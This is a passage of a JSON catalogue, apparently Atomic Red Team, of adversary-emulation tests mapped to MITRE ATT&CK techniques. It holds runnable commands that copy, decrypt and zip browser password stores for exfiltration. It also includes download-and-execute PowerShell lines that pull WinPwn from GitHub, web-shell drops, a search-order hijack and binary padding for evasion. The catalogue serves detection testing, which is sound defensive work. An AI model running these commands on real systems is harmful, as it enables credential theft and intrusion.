https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Firefox must be installed\n", "prereq_command": "if ((Test-Path \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\")) {exit 0} else {exit 1}", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nif ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$url=\"https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US\"}else {$url=\"https://download.mozilla.org/?product=firefox-latest-ssl&os=win&lang=en-US\"}\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\firefoxsetup.exe\"\n(New-Object Net.WebClient).DownloadFile($url,$installer)\nStart-Process $installer -ArgumentList '/S' -Wait\n"}, {"description": "Firefox login data file must exist\n", "prereq_command": "if (Test-Path \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\") {exit 0} else {exit 1}", "get_prereq_command": "if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$firefox=\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"}else {$firefox=\"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\"}\nStart-Process $firefox -ArgumentList '-CreateProfile Atomic' -Wait\nStart-Process $firefox -NoNewWindow\nStart-Sleep -s 20\nStop-Process -Name firefox\n"}], "executor": {"name": "powershell", "command": "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Force -Recurse\n", "cleanup_command": "Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Profiles\" -Force -ErrorAction Ignore -Recurse\n"}}, {"name": "Simulating access to Windows Edge Login Data", "auto_generated_guid": "a6a5ec26-a2d1-4109-9d35-58b867689329", "description": "Simulates an adversary accessing encrypted credentials from Edge web browser's login database.\nmore info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Edge must be installed\n", "prereq_command": "if (Test-Path \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\") {exit 0} else {exit 1}", "get_prereq_command": "\"Installation is not implemented as Edge is a part of windows\"\n"}, {"description": "Edge login data file must exist\n", "prereq_command": "if (Test-Path \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\") {exit 0} else {exit 1}", "get_prereq_command": "$edge=\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"\nStart-Process $edge \nStart-Sleep -s 20\nStop-Process -Name msedge\n"}], "executor": {"name": "powershell", "command": "Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\\Edge\" -Force -Recurse\n", "cleanup_command": "Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Edge\" -Force -ErrorAction Ignore -Recurse\n"}}, {"name": "Decrypt Mozilla Passwords with Firepwd.py", "auto_generated_guid": "dc9cd677-c70f-4df5-bd1c-f114af3c2381", "description": "Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.\nUpon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. \n", "supported_platforms": ["windows"], "input_arguments": {"Firepwd_Path": {"description": "Filepath for Firepwd.py", "type": "string", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\Firepwd.py"}, "Out_Filepath": {"description": "Filepath to output results to", "type": "string", "default": "$env:temp\\T1555.003Test8.txt"}, "VS_CMD_Path": {"description": "Filepath to Visual Studio Build Tools Command prompt", "type": "string", "default": "C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat"}, "Python_Path": {"description": "Filepath to python", "type": "string", "default": "C:\\Program Files\\Python310\\python.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Firepwd must exist at #{Firepwd_Path}\n", "prereq_command": "if (Test-Path \"#{Firepwd_Path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py\" -outfile \"#{Firepwd_Path}\"\n"}, {"description": "Firefox profile directory must be present\n", "prereq_command": "if (get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\" -erroraction silentlycontinue) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\firefox.msi\"\nmsiexec.exe /i \"PathToAtomicsFolder\\..\\ExternalPayloads\\firefox.msi\" /quiet\nsleep -s 30\nstart-process \"$env:programfiles\\Mozilla Firefox\\firefox.exe\".\nsleep -s 5\nstop-process -name \"firefox\"\n"}, {"description": "Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}\n", "prereq_command": "if (Test-Path \"#{VS_CMD_Path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://aka.ms/vs/17/release/vs_BuildTools.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\VS_BuildTools.exe\"\nwrite-host \"Visual Studio Build Tools (Desktop Development with C++) must be installed manually. Please run the installer from PathToAtomicsFolder\\..\\ExternalPayloads\\VS_BuildTools.exe.\"\n"}, {"description": "Python must be installed\n", "prereq_command": "if (Test-Path \"#{Python_Path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"}, {"description": "Pip must be installed.\n", "prereq_command": "$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (pip -v) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://bootstrap.pypa.io/ez_setup.py\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ez_setup.py\"      \ninvoke-webrequest \"https://bootstrap.pypa.io/get-pip.py\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\get-pip.py\"\ncmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\ez_setup.py\"\ncmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\get-pip.py\"\n"}, {"description": "Pycryptodome library must be installed \n", "prereq_command": "$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (pip show pycryptodome) {exit 0} else {exit 1}\n", "get_prereq_command": "$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (test-path \"#{VS_CMD_Path}\"){pip install pycryptodome | out-null | cmd /c %comspec% /k \"#{VS_CMD_Path}\" | out-null} else {write-host \"Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq\"}\n"}, {"description": "Pyasn1 library must be installed \n", "prereq_command": "$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (pip show pyasn1) {exit 0} else {exit 1}\n", "get_prereq_command": "$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (test-path \"#{VS_CMD_Path}\"){pip install pyasn1 | out-null | cmd /c %comspec% /k \"#{VS_CMD_Path}\" | out-null} else {write-host \"Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq.\"}\n"}], "executor": {"name": "powershell", "command": "$PasswordDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\ncmd /c #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}\ncat #{Out_Filepath}\n", "cleanup_command": "Remove-Item -Path \"#{Out_Filepath}\" -erroraction silentlycontinue   \n"}}, {"name": "LaZagne.py - Dump Credentials from Firefox Browser", "auto_generated_guid": "87e88698-621b-4c45-8a89-4eaebdeaabb1", "description": "Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne", "supported_platforms": ["linux"], "input_arguments": {"lazagne_path": {"description": "Path you put LaZagne Github with LaZagne.py", "type": "string", "default": "/tmp/LaZagne/Linux"}, "specific_module": {"description": "You may change the module to \"all\" for all password that can be found by LaZagne.py", "type": "string", "default": "browsers -firefox"}, "output_file": {"description": "This is where output for the Firefox passwords goes", "type": "string", "default": "/tmp/firefox_password.txt"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Get Lazagne from Github and install requirements", "prereq_command": "test -f #{lazagne_path}/laZagne.py", "get_prereq_command": "cd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt"}, {"description": "Needs git, python3 and some pip stuff", "prereq_command": "which git && which python3 && which pip", "get_prereq_command": "apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto"}], "executor": {"command": "python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}", "cleanup_command": "rm -R /tmp/LaZagne; rm -f #{output_file}", "name": "sh", "elevation_required": true}}, {"name": "Stage Popular Credential Files for Exfiltration", "auto_generated_guid": "f543635c-1705-42c3-b180-efd6dc6e7ee7", "description": "This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,\nsimulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData). \n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "command": "$exfil_folder = \"$env:temp\\T1555.003\"\nif (test-path \"$exfil_folder\") {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\" -force}\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data For Account\"} else {}\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} \ncompress-archive -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force\n", "cleanup_command": "Remove-Item -Path \"$env:temp\\T1555.003.zip\" -force -erroraction silentlycontinue   \nRemove-Item -Path \"$env:temp\\T1555.003\\\" -force -recurse -erroraction silentlycontinue\n"}}, {"name": "WinPwn - BrowserPwn", "auto_generated_guid": "764ea176-fb71-494c-90ea-72e9d85dce76", "description": "Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbrowserpwn -consoleoutput -noninteractive", "cleanup_command": "rm .\\System.Data.SQLite.dll -ErrorAction Ignore", "name": "powershell"}}, {"name": "WinPwn - Loot local Credentials - mimi-kittenz", "auto_generated_guid": "ec1d0b37-f659-4186-869f-31a554891611", "description": "Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nkittenz -consoleoutput -noninteractive", "name": "powershell"}}, {"name": "WinPwn - PowerSharpPack - Sharpweb for Browser Credentials", "auto_generated_guid": "e5e3d639-6ea8-4408-9ecd-d5a286268ca0", "description": "PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')\nInvoke-Sharpweb -command \"all\"", "name": "powershell"}}, {"name": "Simulating Access to Chrome Login Data - MacOS", "auto_generated_guid": "124e13e5-d8a1-4378-a6ee-a53cd0c7e369", "description": "This test locates the Login Data files used by Chrome to store encrypted credentials, then copies them to the temp directory for later exfil. \nOnce the files are exfiltrated, malware like CookieMiner could be used to perform credential extraction. \nSee https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/ . \n", "supported_platforms": ["macos"], "executor": {"command": "cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data\" \"/tmp/T1555.003_Login Data\"\ncp ~/Library/\"Application Support/Google/Chrome/Default/Login Data For Account\" \"/tmp/T1555.003_Login Data For Account\"\n", "cleanup_command": "rm \"/tmp/T1555.003_Login Data\" >/dev/null 2>&1\nrm \"/tmp/T1555.003_Login Data For Account\" >/dev/null 2>&1\n", "name": "sh"}}, {"name": "WebBrowserPassView - Credentials from Browser", "auto_generated_guid": "e359627f-2d90-4320-ba5e-b0f878155bbe", "description": "The following Atomic test utilizes WebBrowserPassView to extract passwords from browsers on a Window system. WebBrowserPassView is an open source application used to retrieve passwords stored on a local computer. Recently noticed as a tool used in the BlackCat Ransomware.", "supported_platforms": ["windows"], "input_arguments": {"webbrowserpassview_path": {"description": "Path to the WebBrowserPassView executable ", "type": "string", "default": "PathToAtomicsFolder\\T1555.003\\bin\\WebBrowserPassView.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Check if WebBrowserPassView.exe exists in the specified path #{webbrowserpassview_path}\n", "prereq_command": "if (Test-Path \"#{webbrowserpassview_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1555.003\\bin\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe -OutFile \"#{webbrowserpassview_path}\"\n"}], "executor": {"command": "Start-Process \"#{webbrowserpassview_path}\"\nStart-Sleep -Second 4\nStop-Process -Name \"WebBrowserPassView\"\n", "name": "powershell", "elevation_required": true}}, {"name": "BrowserStealer (Chrome / Firefox / Microsoft Edge)", "auto_generated_guid": "6f2c5c87-a4d5-4898-9bd1-47a55ecaf1dd", "description": "[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line.\nIf using to test with Firefox, if the browser is x64 you need to use the x64 build\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Google Chrome must be on the device.\n", "prereq_command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\"\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi\nmsiexec /i $installer /qn\nStart-Process -FilePath \"chrome.exe\"\nStop-Process -Name \"chrome\"\n"}, {"description": "BrowserCollector must exist in the bin directory\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1555.003\\bin\\BrowserCollector.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1555.003\\bin\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe\" -Outfile: \"PathToAtomicsFolder\\T1555.003\\bin\\BrowserCollector.exe\""}, {"description": "Login Data file that is a copy of a chrome Login Data that contains credentials for the tool to \"steal.\" Must exist at the specified path.\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1555.003\\src\\Login Data\") {exit 0} else {exit 1}", "get_prereq_command": "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T155.003/src/LoginData?raw=true\" -Outfile: \"PathToAtomicsFolder\\T1555.003\\src\\Login Data\""}], "executor": {"command": "Copy-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" > $null\nRemove-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null\nCopy-Item \"$env:PathToAtomicsFolder\\T1555.003\\src\\Login Data\" -Destination \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\\" > $null\ncd \"$env:PathToAtomicsFolder\\T1555.003\\bin\"\n.\\BrowserCollector.exe\n", "cleanup_command": "Remove-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Destination \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data\" > $null\n", "name": "powershell"}}]}, "T1574.008": {"name": "Path Interception by Search Order Hijacking", "technique_id": "attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2", "external_id": "T1574.008", "data_components": ["File Modification", "Process Creation", "File Creation"], "kill_chain_phases": ["persistence", "privilege-escalation", "defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\n\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).", "atomic_tests": [{"name": "powerShell Persistence via hijacking default modules - Get-Variable.exe", "auto_generated_guid": "1561de08-0b4b-498e-8261-e922f3494aae", "description": "Colibri leverages PowerShell in a unique way to maintain persistence after a reboot. Depending on the Windows version, Colibri drops its copy in %APPDATA%\\Local\\Microsoft\\WindowsApps and \nnames it Get-Variable.exe for Windows 10 and above.\nhttps://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/\n", "supported_platforms": ["windows"], "executor": {"command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" \"PathToAtomicsFolder\\T1574.008\\bin\\calc.cs\"\nPowershell -noprofile\n", "cleanup_command": "Remove-Item \"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" -ErrorAction Ignore\nStop-Process -Name \"calculator\"\n", "name": "powershell"}}]}, "T1027.001": {"name": "Binary Padding", "technique_id": "attack-pattern--5bfccc3f-2326-4112-86cc-c1ece9d8a2b5", "external_id": "T1027.001", "data_components": ["File Metadata"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ) ", "atomic_tests": [{"name": "Pad Binary to Change Hash - Linux/macOS dd", "auto_generated_guid": "ffe2346c-abd5-4b45-a713-bf5f1ebd573a", "description": "Uses dd to add a zero byte, high-quality random data, and low-quality random data to the binary to change the hash.\n\nUpon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"file_to_pad": {"description": "Path of binary to be padded", "type": "path", "default": "/tmp/evil-binary"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "The binary must exist on disk at specified location (#{file_to_pad})\n", "prereq_command": "if [ -f #{file_to_pad} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "cp /bin/ls #{file_to_pad}\n"}], "executor": {"command": "dd if=/dev/zero bs=1 count=1 >> #{file_to_pad} #adds null bytes\ndd if=/dev/random bs=1 count=1 >> #{file_to_pad} #adds high-quality random data\ndd if=/dev/urandom bs=1 count=1 >> #{file_to_pad} #adds low-quality random data\n", "cleanup_command": "rm #{file_to_pad}\n", "name": "sh"}}, {"name": "Pad Binary to Change Hash using truncate command - Linux/macOS", "auto_generated_guid": "e22a9e89-69c7-410f-a473-e6c212cd2292", "description": "Uses truncate to add a byte to the binary to change the hash.\n\nUpon successful execution, truncate will modify `/tmp/evil-binary`, therefore the expected hash will change.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"file_to_pad": {"description": "Path of binary to be padded", "type": "path", "default": "/tmp/evil-binary"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "The binary must exist on disk at specified location (#{file_to_pad})\n", "prereq_command": "if [ -f #{file_to_pad} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "cp /bin/ls #{file_to_pad}\n"}], "executor": {"command": "truncate -s +1 #{file_to_pad} #adds a byte to the file size\n", "cleanup_command": "rm #{file_to_pad}\n", "name": "sh"}}]}, "T1505.003": {"name": "Web Shell", "technique_id": "attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb", "external_id": "T1505.003", "data_components": ["Network Traffic Content", "File Creation", "Process Creation", "File Modification", "Application Log Content", "Network Traffic Flow"], "kill_chain_phases": ["persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)", "atomic_tests": [{"name": "Web Shell Written to Disk", "auto_generated_guid": "0a2ce662-1efa-496f-a472-2fe7b080db16", "description": "This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.\nIdea from APTSimulator.\ncmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx\n", "supported_platforms": ["windows"], "input_arguments": {"web_shell_path": {"description": "The path to drop the web shell", "type": "string", "default": "C:\\inetpub\\wwwroot"}, "web_shells": {"description": "Path of Web Shell", "type": "path", "default": "PathToAtomicsFolder\\T1505.003\\src"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Web shell must exist on disk at specified location (#{web_shells})\n", "prereq_command": "if (Test-Path \"#{web_shells}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"#{web_shells}\" -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp\" -OutFile \"#{web_shells}/b.jsp\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp\" -OutFile \"#{web_shells}/tests.jsp\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx\" -OutFile \"#{web_shells}/cmd.aspx\"\n"}], "executor": {"command": "xcopy /I /Y \"#{web_shells}\" #{web_shell_path}\n", "cleanup_command": "del #{web_shell_path}\\b.jsp /q >nul 2>&1\ndel #{web_shell_path}\\tests.jsp /q >nul 2>&1\ndel #{web_shell_path}\\cmd.aspx /q >nul 2>&1\n", "name": "command_prompt"}}]}, "T1484.001": {"name": "Group Policy Modification", "technique_id": "attack-pattern--5d2be8b9-d24c-4e98-83bf-2f5f79477163", "external_id": "T1484.001", "data_components": ["Active Directory Object Modification", "Command Execution", "Active Directory Object Deletion", "Active Directory Object Creation"], "kill_chain_phases": ["defense-evasion", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to 